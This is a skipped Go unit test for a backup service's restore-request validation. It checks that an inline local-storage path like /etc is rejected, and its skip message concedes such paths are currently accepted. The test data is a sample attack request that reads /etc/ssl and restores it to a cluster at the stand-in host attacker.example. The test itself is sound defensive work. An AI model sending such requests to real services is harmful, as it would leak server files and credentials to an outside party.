package dto

import (
	"testing"

	"github.com/stretchr/testify/require"
)

// An inline local-storage definition in a restore request must not point outside a configured
// storage root: with an absolute path an API caller can read any directory the service can.
func TestRestoreRequest_RejectsInlineAbsoluteLocalStorage(t *testing.T) {
	t.Skip("BKRS-420: inline local storage with an absolute path is accepted")

	req := &RestoreRequest{
		DestinationClusterConfig: DestinationClusterConfig{
			Cluster: &AerospikeCluster{SeedNodes: []SeedNode{{HostName: "attacker.example", Port: 3000}}},
		},
		StorageConfig: StorageConfig{
			Storage: &Storage{LocalStorage: &LocalStorage{Path: "/etc"}},
		},
		BackupDataPath: "ssl",
	}

	require.Error(t, req.Validate())
}
